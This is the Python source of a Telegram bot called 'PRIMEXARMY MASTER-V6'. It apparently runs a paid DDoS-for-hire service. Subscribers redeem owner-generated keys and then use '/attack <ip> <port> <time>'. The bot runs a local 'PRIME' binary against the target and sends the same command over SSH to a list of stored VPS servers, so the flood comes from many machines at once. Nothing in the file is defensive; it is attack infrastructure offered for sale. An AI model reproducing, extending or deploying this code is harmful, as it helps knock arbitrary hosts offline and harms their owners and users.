import os, time, json, paramiko, random, string, threading, subprocess, sys
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
from datetime import datetime

# CONFIG
TELEGRAM_TOKEN = os.getenv("API_KEY") 
OWNER_ID = int(os.getenv("OWNER_ID", 0))

# Check if token exists
if not TELEGRAM_TOKEN:
    print("❌ ERROR: API_KEY environment variable not set!")
    sys.exit(1)

if OWNER_ID == 0:
    print("⚠️ WARNING: OWNER_ID not set!")

FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
for f in FILES: 
    if not os.path.exists(f): 
        with open(f, 'w') as out: 
            if "vps" in f:
                json.dump([], out)
            else:
                json.dump({}, out)

def load_data(file):
    try:
        with open(file, 'r') as f: 
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        if "vps" in file:
            return []
        return {}

def save_data(file, data):
    with open(file, 'w') as f: 
        json.dump(data, f, indent=2)

BANNER = "⚔️ 𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗠𝗔𝗦𝗧𝗘𝗥-𝗩𝟲 ⚔️"

def is_auth(uid):
    uid_str = str(uid)
    users = load_data("users.json")
    resellers = load_data("resellers.json")
    if uid == OWNER_ID or uid_str in resellers: 
        return True
    if uid_str in users and users[uid_str].get('expiry', 0) > time.time(): 
        return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Check if user is authorized
    if is_auth(user_id):
        status = "✅ Authorized User"
        expiry = ""
        users = load_data("users.json")
        if str(user_id) in users and users[str(user_id)].get('expiry'):
            exp_time = users[str(user_id)]['expiry']
            days_left = int((exp_time - time.time()) / 86400)
            expiry = f"\n📅 Days Left: {days_left}"
        
        await update.message.reply_text(
            f"{BANNER}\n\n"
            f"👋 Welcome {first_name}!\n"
            f"{status}{expiry}\n\n"
            f"📌 Commands:\n"
            f"🔹 /attack <ip> <port> <time> - Start Attack\n"
            f"🔹 /redeem <key> - Activate Account\n\n"
            f"💡 For support contact Owner",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            f"{BANNER}\n\n"
            f"👋 Welcome {first_name}!\n"
            f"❌ You don't have active subscription.\n\n"
            f"📌 Commands:\n"
            f"🔹 /redeem <key> - Activate Account\n\n"
            f"💡 Contact @PrimeXAdmin to get access",
            parse_mode="Markdown"
        )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_auth(user_id):
        await update.message.reply_text("❌ Access Denied! You don't have permission to use this bot.")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "⚠️ **Usage:** `/attack <ip> <port> <time>`\n\n"
            "Example: `/attack 192.168.1.1 80 60`",
            parse_mode="Markdown"
        )
        return
    
    ip, port, dur = context.args[0], context.args[1], context.args[2]
    
    # Validate inputs
    try:
        port = int(port)
        dur = int(dur)
        if dur > 300:
            await update.message.reply_text("❌ Max attack time is 300 seconds!")
            return
        if dur < 10:
            await update.message.reply_text("❌ Min attack time is 10 seconds!")
            return
    except ValueError:
        await update.message.reply_text("❌ Port and Time must be numbers!")
        return
    
    await update.message.reply_text(
        f"🚀 **ATTACK SENT!**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏳ Duration: `{dur}s`\n"
        f"👤 Requested by: {update.effective_user.first_name}",
        parse_mode="Markdown"
    )
    
    # 1. LOCAL ATTACK (if PRIME binary exists)
    if os.path.exists("./PRIME"):
        try:
            subprocess.Popen(f"./PRIME {ip} {port} {dur}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[+] Local attack started: {ip}:{port} for {dur}s")
        except Exception as e:
            print(f"[-] Local attack failed: {e}")
    else:
        print("[!] PRIME binary not found, skipping local attack")
    
    # 2. VPS ATTACK
    vps_servers = load_data("vps.json")
    if vps_servers:
        for vps in vps_servers:
            threading.Thread(target=ssh_exec, args=(vps, ip, port, dur), daemon=True).start()
        print(f"[+] Attack dispatched to {len(vps_servers)} VPS servers")
    else:
        print("[!] No VPS servers configured")

def ssh_exec(vps, ip, port, dur):
    """Execute attack on remote VPS"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            vps['ip'], 
            username=vps['user'], 
            password=vps['pass'], 
            timeout=10
        )
        # Check if PRIME exists, if not upload it
        stdin, stdout, stderr = ssh.exec_command("test -f ./PRIME && echo 'exists' || echo 'notfound'")
        result = stdout.read().decode().strip()
        
        if result == 'notfound':
            print(f"[!] PRIME not found on {vps['ip']}")
        else:
            ssh.exec_command(f"./PRIME {ip} {port} {dur} > /dev/null 2>&1 &")
            print(f"[+] Attack sent to VPS: {vps['ip']}")
        
        ssh.close()
    except Exception as e:
        print(f"[-] SSH failed for {vps.get('ip', 'unknown')}: {str(e)[:50]}")

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate key (Owner only)"""
    if str(update.effective_user.id) != str(OWNER_ID):
        await update.message.reply_text("❌ Only Owner can generate keys!")
        return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/gen <days>`\nExample: `/gen 30`", parse_mode="Markdown")
        return
    
    try:
        days = int(context.args[0])
        if days < 1 or days > 365:
            await update.message.reply_text("❌ Days must be between 1 and 365!")
            return
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid number of days!")
        return
    
    key = f"PRIME-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys = load_data("keys.json")
    keys[key] = {"dur": days * 86400, "created": time.time()}
    save_data("keys.json", keys)
    
    await update.message.reply_text(
        f"✅ **Key Generated Successfully!**\n\n"
        f"🔑 **Key:** `{key}`\n"
        f"📅 **Validity:** `{days} Days`\n\n"
        f"User can redeem using: `/redeem {key}`",
        parse_mode="Markdown"
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem activation key"""
    uid = str(update.effective_user.id)
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/redeem <key>`", parse_mode="Markdown")
        return
    
    key = context.args[0].upper()
    keys = load_data("keys.json")
    
    if key in keys:
        users = load_data("users.json")
        expiry_time = time.time() + keys[key]["dur"]
        users[uid] = {"expiry": expiry_time, "redeemed_at": time.time()}
        save_data("users.json", users)
        
        # Remove used key
        del keys[key]
        save_data("keys.json", keys)
        
        days = int(keys[key]["dur"] / 86400) if key in keys else 30
        await update.message.reply_text(
            f"✅ **Account Activated!**\n\n"
            f"🎉 Your subscription is now active!\n"
            f"📅 Valid for: `{days} Days`\n\n"
            f"Use `/start` to see available commands.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ Invalid or Expired Key!")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot status"""
    await update.message.reply_text(
        f"✅ **Bot is Online!**\n\n"
        f"🤖 Status: Active\n"
        f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"👑 Owner ID: {OWNER_ID}\n\n"
        f"Use /start for commands",
        parse_mode="Markdown"
    )

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get user info"""
    user_id = str(update.effective_user.id)
    users = load_data("users.json")
    
    if user_id in users:
        expiry = users[user_id]['expiry']
        days_left = int((expiry - time.time()) / 86400)
        hours_left = int((expiry - time.time()) / 3600) % 24
        
        await update.message.reply_text(
            f"📊 **Your Information**\n\n"
            f"🆔 User ID: `{user_id}`\n"
            f"👤 Name: {update.effective_user.first_name}\n"
            f"✅ Status: Active\n"
            f"📅 Days Left: `{days_left}d {hours_left}h`\n"
            f"⏰ Expires: {datetime.fromtimestamp(expiry).strftime('%Y-%m-%d')}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            f"❌ No active subscription found!\n\n"
            f"Use `/redeem <key>` to activate.",
            parse_mode="Markdown"
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    commands = (
        f"{BANNER}\n\n"
        f"📌 **Available Commands:**\n\n"
        f"🔹 `/start` - Check bot status\n"
        f"🔹 `/attack <ip> <port> <time>` - Launch attack\n"
        f"🔹 `/redeem <key>` - Activate account\n"
        f"🔹 `/myinfo` - Check subscription status\n"
        f"🔹 `/status` - Bot status\n"
        f"🔹 `/help` - Show this help\n\n"
        f"⚠️ **Owner Commands:**\n"
        f"🔹 `/gen <days>` - Generate activation key\n\n"
        f"💡 **Example:**\n"
        f"`/attack 1.1.1.1 80 60`"
    )
    await update.message.reply_text(commands, parse_mode="Markdown")

if __name__ == "__main__":
    print(f"{BANNER}")
    print(f"[+] Bot Starting...")
    print(f"[+] Telegram Token: {'✓' if TELEGRAM_TOKEN else '✗'}")
    print(f"[+] Owner ID: {OWNER_ID if OWNER_ID != 0 else 'Not Set'}")
    
    try:
        app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
        
        # Add command handlers
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("gen", gen))
        app.add_handler(CommandHandler("redeem", redeem))
        app.add_handler(CommandHandler("status", status))
        app.add_handler(CommandHandler("myinfo", myinfo))
        app.add_handler(CommandHandler("help", help_command))
        
        print("[+] Bot handlers registered successfully!")
        print("[+] Bot is polling for updates...")
        
        # Run the bot
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
        
    except Exception as e:
        print(f"[-] Failed to start bot: {e}")
        sys.exit(1)